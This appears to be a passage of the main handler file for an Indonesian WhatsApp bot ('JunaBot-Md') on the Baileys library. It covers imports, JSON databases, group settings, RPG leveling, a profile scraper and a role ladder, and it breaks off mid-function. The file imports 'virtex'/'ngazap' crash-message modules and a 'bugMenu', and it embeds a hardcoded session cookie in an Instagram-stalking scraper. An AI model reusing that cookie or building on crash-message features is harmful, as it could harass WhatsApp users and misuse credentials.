//Sc JunaBot-Md By Junaa Selebew
//jgn lupa enc klo mau di publik/run pake panel, nanti kena curi kang panel😱

//▢━━━━━━━━━━━━━━「 FUNGSI 」━━━━━━━━━━━━━━▢
const { 
BufferJSON, 
WA_DEFAULT_EPHEMERAL, 
generateWAMessageFromContent, 
proto, 
generateWAMessageContent, 
generateWAMessage, 
prepareWAMessageMedia, 
downloadContentFromMessage,
areJidsSameUser, 
getContentType,
delay
} = require('@adiwajshing/baileys')

const fs = require('fs')
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const translate = require("@vitalets/google-translate-api");
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const cheerio = require('cheerio')
const cookie = require('cookie')
const path = require('path')
const { Configuration, OpenAIApi } = require('openai');
const os = require('os')
const toMS = require("ms");
const ms = require("parse-ms");
const nou = require("node-os-utils");
const kotz = require("kotz-api");
const instagramGetUrl = require("instagram-url-direct");
const gtts = require('node-gtts')
const bochil = require("@bochilteam/scraper");
const hxz = require("hxz-api");
const yts = require ("yt-search");
const FormData = require("form-data");
const makeer = require('textprome-scraper');
const maker = new makeer()
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { sizeFormatter } = require("human-readable");
const { TiktokDL } = require("@tobyg74/tiktok-api-dl")
const similarity = require('similarity')
const ytdl = require('ytdl-core')
const threshold = 0.72

let format = sizeFormatter({
std: "JEDEC", // 'SI' (default) | 'IEC' | 'JEDEC'
decimalPlaces: 2,
keepTrailingZeroes: false,
render: (literal, symbol) => `${literal} ${symbol}B`,
});
var dbs = []
global.dbc = dbs

//▢━━━━━━━━━━━━━━「 SCRAPERR 」━━━━━━━━━━━━━━▢
const _prem = require("./lib/premium");
const _mingguan = require("./lib/mingguan");
const _bulanan = require("./lib/bulanan");
const _sewa = require("./lib/sewa");
const { isSetWelcome, addSetWelcome, changeSetWelcome, removeSetWelcome } = require('./lib/setwelcome');
const { isSetLeft, addSetLeft, removeSetLeft, changeSetLeft } = require('./lib/setleft');
const { getLimit, isLimit, limitAdd, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { resetToxic, getToxic, toxicAdd, isToxic } = require("./lib/toxic");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { getCode, addCode } = require("./lib/daftar");
const { addRespons, checkRespons, deleteRespons } = require('./lib/respon');
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');
const { isSetOpen, addSetOpen, removeSetOpen, changeSetOpen, getTextSetOpen } = require("./lib/setopen");
const { isSetClose, addSetClose, removeSetClose, changeSetClose, getTextSetClose } = require("./lib/setclose");
const { casinoSave, setCasino, deleteCasino } = require("./lib/casino");
const spamdetek = require("./lib/antispam");
const { generateProfilePicture, removeEmojis, smsg, tanggal, formatp, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { yta, ytv } = require('./lib/ytdl')
const { goLens } = require("./lib/googlens");
const { topUp } = require("./lib/duniagames");
const { TelegraPh, UploadFileUgu } = require('./lib/uploader')
const { quote } = require('./lib/quote') 
const { jadwalsholat } = require('@bochilteam/scraper')
const { pinterest } = require('./lib/scraper')
const { igdl } = require('./lib/igdl')
const { tiktokdl } = require('tiktokdl') 
const { TelegraPH } = require("./lib/TelegraPH")
const { remini } = require('./lib/remini')
const { virtexnya } = require("./lib/virtex")
const { ngazap } = require ('./lib/ngazap')
const { virtex } = require ('./lib/virtex')
const ffstalk = require('./lib/ffstalk')
const mlstalk = require('./lib/mlstalk')
const photooxy = require('./lib/photooxy')
const { color, bgcolor } = require('./lib/color')
const { getTextSetWelcome } = require('./lib/setwelcome');
const { getTextSetLeft } = require('./lib/setleft');
const afk = require("./lib/afk");

//▢━━━━━━━━━━━━━━「 DATA BASE  」━━━━━━━━━━━━━━▢
let setiker = JSON.parse(fs.readFileSync('./database/stik.json'))
let audionye = JSON.parse(fs.readFileSync('./database/vn.json'))
let imagenye = JSON.parse(fs.readFileSync('./database/image.json'))
let videonye = JSON.parse(fs.readFileSync('./database/video.json'))
let set_welcome_db = JSON.parse(fs.readFileSync('./database/set_welcome.json'));
let set_left_db = JSON.parse(fs.readFileSync('./database/set_left.json'));
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'));
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'));
let set_open = JSON.parse(fs.readFileSync('./database/set_open.json'));
let set_close = JSON.parse(fs.readFileSync('./database/set_close.json'));
let _afk = JSON.parse(fs.readFileSync('./database/afk.json'));
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
let opengc = JSON.parse(fs.readFileSync('./database/opengc.json'));
let closegc = JSON.parse(fs.readFileSync('./database/closegc.json'));
let _nsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
let pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
let banned = JSON.parse(fs.readFileSync('./database/banned.json'))
let daftar = JSON.parse(fs.readFileSync('./database/daftar.json'));
let mess = JSON.parse(fs.readFileSync('./mess.json'));
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
let mingguan = JSON.parse(fs.readFileSync('./database/mingguan.json'));
let bulanan = JSON.parse(fs.readFileSync('./database/bulanan.json'));
let balance = JSON.parse(fs.readFileSync('./database/balance.json'));
let limit = JSON.parse(fs.readFileSync('./database/limit.json'));
let toxic = JSON.parse(fs.readFileSync('./database/toxic.json'));
let glimit = JSON.parse(fs.readFileSync('./database/glimit.json'));
let kickme = JSON.parse(fs.readFileSync('./database/kickme.json'));
let mute = JSON.parse(fs.readFileSync('./database/mute.json'));
let antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'));
let autodlgc = JSON.parse(fs.readFileSync('./database/autodlgc.json'));
let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
let antitoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'));
let antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let antilinktt = JSON.parse(fs.readFileSync('./database/antilinktt.json'));
let antiwame2 = JSON.parse(fs.readFileSync('./database/antiwame2.json'));
let antilink2 = JSON.parse(fs.readFileSync('./database/antilink2.json'));
let listCmd = JSON.parse(fs.readFileSync('./database/listcmd.json'));
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
let modsNumber = JSON.parse(fs.readFileSync('./database/modsNumber.json'));
let responDB = JSON.parse(fs.readFileSync('./database/respon.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));
let _limit = JSON.parse(fs.readFileSync('./database/user/limit.json'));
let _buruan = JSON.parse(fs.readFileSync('./database/user/hasil_buruan.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./database/user/darah.json'))
let openaipc = JSON.parse(fs.readFileSync('./database/openaipc.json'))
let openaigc = JSON.parse(fs.readFileSync('./database/openaigc.json'))
const _petualang = JSON.parse(fs.readFileSync('./database/user/inventory.json'))
const { addInventoriDarah, cekDuluJoinAdaApaKagaDiJson, addDarah, kurangDarah, getDarah } = require('./database/user/darah.js')
const { cekInventoryAdaAtauGak } = require('./database/user/alat_tukar.js')
const { addInventoriMonay, cekDuluJoinAdaApaKagaMonaynyaDiJson, addMonay, kurangMonay, getMonay } = require('./database/user/monay.js')
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit } = require('./database/user/limit.js')
const { cekDuluHasilBuruanNya, addInventoriBuruan, addAyam, addKelinci, addDomba, addSapi, addGajah, kurangIkan, kurangAyam, kurangKelinci, kurangDomba, kurangSapi,kurangGajah, getIkan, getAyam, getKelinci, getDomba,getSapi,getGajah} = require('./database/user/buruan.js')
const { getLevelingXp,getLevelingLevel,getLevelingId,addLevelingXp,addLevelingLevel,addLevelingId,addATM,addKoinUser,checkATMuser,addIkan,getMancingIkan,getMancingId,addMancingId,jualIkan,addPlanet,getBertualangPlanet,getPlaneId,addPlaneId,jualbahankimia,addCoal,getMiningcoal,getMiningId,addMiningId,jualcoal,addStone,getMiningstone,getBatuId,addBatuId,jualstone,addOre,getMiningore,getOreId,addOreId,jualore,addIngot,getMiningingot,getIngotId,addIngotId,jualingot,addKayu,getNebangKayu,getNebangId,addNebangId,jualKayu, checkPetualangUser, addInventori, sellBesi, addDm, sellDm, getDm, sellEmas, addFish, sellFish, getFish, addBesi, addEmas, addEmerald, addUmpan, addPotion, kurangBesi, kurangEmas, kurangEmerald, kurangUmpan, kurangPotion,getBesi, getEmas, getEmerald,getUmpan,getPotion} = require('./database/user/rpg.js')

let DarahAwal = 100;
const ikan = ['🐟','🐠','🐡']
const enter = '\n'

//▢━━━━━━━━━━━━━━「 GAME DATABASE 」━━━━━━━━━━━━━━▢
let tictactoe = [];
let kuis = []
const kuismath = {}
const _family100 = {}
const tebakgambar = {}
const tebakgame ={}
const tebakhero ={}
const tebakaplikasi ={}
const tebakkata = {}
const asahotak = {}
const lengkapikalimat = {}
const tebakbendera = {}
const siapaaku = {}
const tebakkalimat = {}
const caklontong = {}
const susunkata = {}
const tekateki = {}
const tebakkabupaten = {}
const tebakkimia = {}
const tebaklirik = {}
const tebaktebakan = {}

//▢━━━━━━━━━━━━━━「 AUTO RESET LIMIT 」━━━━━━━━━━━━━━▢
/*setInterval(function() { 
var jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
var hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna
if(hasilnes === '12:00:00 AM') {
limit = []
fs.writeFileSync('./database/limit.json', JSON.stringify(limit))
glimit = []
fs.writeFileSync('./database/glimit.json', JSON.stringify(glimit))
console.log("Limit Sudah Di Reset!")
}
}, 1000);*/

//▢━━━━━━━━━━━━━━「 BANDWITH  」━━━━━━━━━━━━━━▢
async function checkBandwidth() {
let ind = 0;
let out = 0;
for (let i of await require("node-os-utils").netstat.stats()) {
ind += parseInt(i.inputBytes);
out += parseInt(i.outputBytes);
}
return {
download: format(ind),
upload: format(out),
};
}

//▢━━━━━━━━━━━━━━「 MODULE EXPORTS 」━━━━━━━━━━━━━━▢
moment.tz.setDefault("Asia/Jakarta").locale("id");
module.exports = juna = async (juna, m, chatUpdate, mek, store, setting, isSetWelcome, getTextSetWelcome, set_welcome_db, set_left_db, isSetLeft, getTextSetLeft, _welcome, _left, antidelete, antionce) => {
try {
const { ownerNumber, instagram, gcwa, ownerName, botName, footer, pathimg, gamewaktu, toxicCount, limitCount } = setting
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
var budy = (typeof m.text == 'string' ? m.text : '')
const content = JSON.stringify(mek.message)
const type = Object.keys(mek.message)[0];
if (m && type == "protocolMessage") juna.ev.emit("message.delete", m.message.protocolMessage.key);
const botNumber = await juna.decodeJid(juna.user.id)
const isCreator = [botNumber, ...ownerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const isCommand = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ""
const command = isCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCommand
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const { allMenu, simpleMenu, mainMenu, convertMenu, anonymousMenu, storeMenu, rpgMenu, gameMenu, groupMenu, downloadMenu, searchMenu, randomMenu, randomQuotes, cewekMenu, cowokMenu, balanceMenu, ownerMenu, storageMenu, asupanMenu, randomSticker, stalkingMenu, imageEffect, funMenu, islamMenu, bugMenu, nsfwMenu, textproMenu, photooxyMenu, ephotoMenu, logoMenu, donate} = require('./menu') 
let footxt = `${footer}`
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const jam = moment().format("HH:mm:ss z")
const jam6 = moment().format("HH:mm z")
const time2 = moment().tz('Asia/Jakarta').format("HH:mm:ss")
 if(time2 < "23:59:00"){
var ucapanWaktu = `[ ${jam6} ] Malam 🌌`
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = `[ ${jam6} ] Sore 🌃`
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = `[ ${jam6} ] Sore 🌅`
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = `[ ${jam6} ] Siang 🏙`
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = `[ ${jam6} ] Pagi 🌄`
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = `[ ${jam6} ] Pagi 🌉`
 } 

//▢━━━━━━━━━━━━━━「 GROUP FUNGSI  」━━━━━━━━━━━━━━▢
const groupMetadata = m.isGroup ? await juna.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isUser = pendaftar.includes(m.sender)
const isBan = banned.includes(m.sender)
const isPetualang = checkPetualangUser(m.sender)
const isPremium = isCreator ? true : _prem.checkPremiumUser(m.sender, premium)
const isMingguan = _mingguan.checkMingguanUser(m.sender, mingguan)
const isBulanan = _bulanan.checkBulananUser(m.sender, bulanan)
const isSewa = _sewa.checkSewaGroup(m.chat, sewa)
const isKickMe = kickme.includes(m.chat) ? true : false
const isMute= mute.includes(m.chat) ? true : false
const isAntivirtex = antivirtex.includes(m.chat) ? true : false
const isAutodlgc = autodlgc.includes(m.chat) ? true : false
const isAntiLink = antilink.includes(m.chat) ? true : false
const isAntiLinktt = antilinktt.includes(m.chat) ? true : false
const isAntitoxic = antitoxic.includes(m.chat) ? true : false
const isAntidelete = antidelete.includes(m.chat) ? true : false
const isAntionce = antionce.includes(m.chat) ? true : false
const isAutoAiGc = openaigc.includes(m.chat) ? true : false
const isAutoAiPc = openaipc.includes(botNumber) ? true : false
const isWelcome = _welcome.includes(m.chat) ? true : false
const isLeft = _left.includes(m.chat) ? true : false
const isAfkOn = afk.checkAfkUser(m.sender, _afk)
const isNsfw = _nsfw.includes(m.chat) ? true : false
const isAntiWame = antiwame.includes(m.chat) ? true : false
const isAntiWame2 = antiwame2.includes(m.chat) ? true : false
const isAntiLink2 = antilink2.includes(m.chat) ? true : false
const gcounti = setting.gcount
const gcount = isPremium ? gcounti.prem : gcounti.user
let timestamp = speed();
let latensi = speed() - timestamp
const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { conversation: `👤 *${pushname}*\n🔢 *+${m.sender.split('@')[0]}*` }}
const fkontakk = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}👤`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': pathimg, thumbnail: pathimg,sendEphemeral: true}}}
const fkontaku = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': pathimg, thumbnail: pathimg,sendEphemeral: true}}}
const fbot = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': `MAKIMA - BOT`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': pathimg, thumbnail: pathimg,sendEphemeral: true}}}
const isDarah = await cekDuluJoinAdaApaKagaDiJson(m.senpder)
const isCekDarah = await getDarah(m.sender)
const isUmpan = await getUmpan(m.sender)
const isPotion = await getPotion(m.sender)
const isIkan = await getIkan(m.sender)
const isAyam = await getAyam(m.sender)
const isKelinci = await getKelinci(m.sender)
const isDomba = await getDomba(m.sender)
const isSapi = await getSapi(m.sender)
const isGajah = await getGajah(m.sender)
const isMonay = await getBalance(m.sender, balance)
const isBesi = await getBesi(m.sender)
const isEmas = await getEmas(m.sender)
const isEmerald = await getEmerald(m.sender)
const isInventory = await cekInventoryAdaAtauGak(m.sender)
const isInventoriBuruan = await cekDuluHasilBuruanNya(m.sender)
const isInventoryLimit = await cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
const isInventoryMonay = await cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
dbs.push({id: m.key.id, m}); 

const ments = (text) => {return text.match('@') ? [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []}

const reply = (teks) => {
return juna.sendMessage(m.chat, { text: teks, mentions: ments(teks) }, {quoted: m})
}
//Function Polling
juna.ments = (teks = '') => {
return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
};
juna.sendteks = async(chatId, text = '', quoted = '', opts = {}) => {
return juna.sendMessage(chatId, { text: text, mentions: await juna.ments(text), ...opts}, {quoted:quoted})
};
juna.sendPoll = (jid, name = '', values = [], selectableCount = global.select) => {
return juna.sendMessage(jid, {poll: { name, values, selectableCount }})
};
// RESPON CMD POLL MESSAGE THE JO BOT
async function getMessage(key){
if (store) {
const msg = await store.loadMessage(key.remoteJid, key.id)
return msg?.message
}
return {conversation: 'MAKIMA - BOT'}
}

juna.ev.on('messages.update', async(chatUpdate) => {
for (const { key, update } of chatUpdate) {
if (update.pollUpdates && key.fromMe) {
const pollCreation = await getMessage(key)
if (pollCreation) {
const pollUpdate = await getAggregateVotesInPollMessage({
message: pollCreation,
pollUpdates: update.pollUpdates,
})
const command = pollUpdate.filter(v => v.voters.length !== 0)[0]?.name
if (command == undefined) return
const comand = global.prefix+command
console.log(comand)
juna.appenTextMessage(comand, chatUpdate)
}
}
}
})
const nebal = (angka) => {
return Math.floor(angka)
}
if(!isPetualang){
reqXp = 5000 * (Math.pow(2, getLevelingLevel(m.sender)) - 1)
await _petualang.push(m.sender)
await addInventoriDarah(m.sender, DarahAwal)
await addInventori(m.sender)
await addInventoriBuruan(m.sender)
await fs.writeFileSync('./database/user/inventory.json', JSON.stringify(_petualang))
await addLevelingId(m.sender)
console.log(`${pushname} 𝙏𝙚𝙡𝙖𝙝 𝘿𝙞𝙩𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣 𝙆𝙚𝙙𝙖𝙡𝙖𝙢 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚 MAKIMA - BOT`)
}

function hitungmundur(tanggal, bulan, tahun){
let from = new Date(`${bulan} ${tanggal}, ${tahun} 00:00:00`).getTime();
let now = Date.now();
let distance = from - now;
let days = Math.floor(distance / (1000 * 60 * 60 * 24));
let hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
let seconds = Math.floor((distance % (1000 * 60)) / 1000);
return days + ' Hari ' + hours + ' Jam ' + minutes + ' Menit '
}

const isEmoji = (emo) => {
let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
let regexEmoji = new RegExp(emoji_ranges, 'gi');
return emo.match(regexEmoji)
}

async function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function igstalk(Username) {
return new Promise((resolve, reject) => {
axios.get('https://dumpor.com/v/'+Username, {
headers: {
"cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
}
}).then(res => {
const $ = cheerio.load(res.data)
const result = {
profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
}
resolve(result)
})
})
}

const totalFitur = () =>{
var mytext = fs.readFileSync("./junn.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper
}

const totalFitur2 = () =>{
var mytext = fs.readFileSync("./junn.js").toString()
var numUpper = (mytext.match(/case'/g) || []).length;
return numUpper
}

const totalFitur3 = () =>{
var mytext = fs.readFileSync("./junn.js").toString()
var numUpper = (mytext.match(/case "/g) || []).length;
return numUpper
}

async function getGcName(groupID) {
try {
let data_name = await juna.groupMetadata(groupID)
return data_name.subject
} catch (err) {
return '-'
}
}

function randomNomor(min, max = null) {
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}
/*if ( m.mtype == 'viewOnceMessage' && m.msg.viewOnce) {
try {
juna.ev.emit("viewOnceMessage", m);
} catch (err) {
console.error(util.format(err))
}}*/
try {
let chats = db.data.chats[m.chat]
if (typeof chats !== 'object') db.chats[m.chat] = {}
if (chats) {
if (!('goodbye' in chats)) chats.goodbye = setting.auto_leaveMsg
if (!('welcome' in chats)) chats.welcome = setting.auto_welcomeMsg
} else db.chats[m.chat] = {
goodbye: setting.auto_leaveMsg, 
welcome: setting.auto_welcomeMsg, 
}
} catch (e){
console.log(e)
}


if (!juna.public) {
if (!m.key.fromMe && !isCreator) return
}


if (m.isGroup) {
const Fisha = await getMancingIkan(m.sender)
const FishId = await getMancingId(m.sender)
if (Fisha === undefined && FishId === undefined) await addMancingId(m.sender)
}

if (m.isGroup) {
const Hapea = await getBertualangPlanet(m.sender)
const HapeId = await getPlaneId(m.sender)
if (Hapea === undefined && HapeId === undefined) await addPlaneId(m.sender)
}

if (m.isGroup) {
const Coala = await getMiningcoal(m.sender)
const CoalId = await getMiningId(m.sender)
if (Coala === undefined && CoalId === undefined) await addMiningId(m.sender)
}

if (m.isGroup) {
const Stonea = await getMiningstone(m.sender)
const StoneId = await getBatuId(m.sender)
if (Stonea === undefined && StoneId === undefined) await addBatuId(m.sender)
}

if (m.isGroup) {
const Orea = await getMiningore(m.sender)
const OreId = await getOreId(m.sender)
if (Orea === undefined && OreId === undefined) await addOreId(m.sender)
}

if (m.isGroup) {
const Ingota = await getMiningingot(m.sender)
const IngotId = await getIngotId(m.sender)
if (Ingota === undefined && IngotId === undefined) await addIngotId(m.sender)
}

if (m.isGroup) {
const Kayua = await getNebangKayu(m.sender)
const KayuId = await getNebangId(m.sender)
if (Kayua === undefined && KayuId === undefined) await addNebangId(m.sender)
}

if (m.isGroup ) {
const checkATM = await checkATMuser(m.sender)
try {
if (checkATM === undefined) await addATM(m.sender)
const uangsaku = Math.floor(Math.random() * 10) + 90
addKoinUser(m.sender, uangsaku)
} catch (err) {
console.error(err)
}
}
var levelRole = getBalance(m.sender, balance)
var role = 'Bronze 1'
if (levelRole <= 2) {
role = 'Bronze 1'
} else if (levelRole <= 250) {
role = 'Bronze 2'
} else if (levelRole <= 300) {
role = 'Bronze 3'
} else if (levelRole <= 1000) {
role = 'Silver 1'
} else if (levelRole <= 2000) {
role = 'Silver 2'
} else if (levelRole <= 3000) {
role = 'Silver 3'
} else if (levelRole <= 5000) {
role = 'Gold 1'
} else if (levelRole <= 6000) {
role = 'Gold 2'
} else if (levelRole <= 7000) {
role = 'Gold 3'
} else if (levelRole <= 9000) {
role = 'Platinum 1'
} else if (levelRole <= 10000) {
role = 'Platinum 2'
} else if (levelRole <= 11000) {
role = 'Platinum 3'
} else if (levelRole <= 12000) {
role = 'Platinum 4'
} else if (levelRole <= 13000) {
role = 'Platinum 5'
} else if (levelRole <= 16000) {
role = 'Diamond 1'
} else if (levelRole <= 17000) {
role = 'Diamond 2'
} else if (levelRole <= 18000) {
role = 'Diamond 3'
} else if (levelRole <= 19000) {
role = 'Diamond 4'
} else if (levelRole <= 20000) {
role = 'Diamond 5'
} else if (levelRole <= 30000) {
role = 'Master'
} else if (levelRole <= 40000) {
role = 'Master ✩'
} else if (levelRole <= 50000) {
role = 'Master ✩✩'
} else if (levelRole <= 60000) {
role = 'Master ✩✩✩'
} else if (levelRole <= 70000) {
role = 'Master ✯'
} else if (levelRole <= 80000) {
role = 'Master ✯✯'
} else if (levelRole <= 100000) {
role = 'Master ✯✯✯'
} else if (levelRole <= 110000) {
role = 'GrandMaster'
} else if (levelRole <= 120000) {
role = 'GrandMaster ✩'
} else if (levelRole <= 130000) {
role = 'GrandMaster ✩✩'
} else if (levelRole <= 140000) {
role = 'GrandMaster ✩✩✩'
} else if (levelRole <= 150000) {
role = 'GrandMaster ✯'
} else if (levelRole <= 160000) {
role = 'GrandMaster ✯✯'
} else if (levelRole <= 170000) {
role = 'GrandMaster ✯✯✯'
} else if (levelRole <= 210000000) {
role = 'KING SEPUHHH 숒'
